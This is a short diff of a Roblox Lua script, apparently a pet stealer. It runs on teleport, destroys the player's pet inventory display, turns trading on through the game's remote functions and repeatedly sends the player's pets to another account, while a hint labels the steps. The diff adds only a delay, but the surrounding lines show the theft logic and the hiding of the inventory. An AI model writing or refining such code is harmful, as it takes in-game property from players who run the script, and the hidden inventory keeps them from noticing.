@@ -964,6 +964,7 @@ queue_on_teleport([==[
 		game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Pets:Destroy()
 	end)
 	local IDs = {]==] .. IDs .. [==[}
+	wait(4)
         local hint = Instance.new('Hint', workspace)
 	hint.Text = '[3/4] Trading pets to account'
 
@@ -992,7 +993,7 @@ queue_on_teleport([==[
 	if not workspace.__REMOTES.Core['Get Stats']:InvokeServer().Save.TradingEnabled then
 		workspace.__REMOTES.Game.Trading:InvokeServer("ToggleTrading")
 	end
-
+	
         repeat task.wait(.25) until T:InvokeServer("InvSend", PLR) == true
         
         repeat task.wait() until lastTradeId
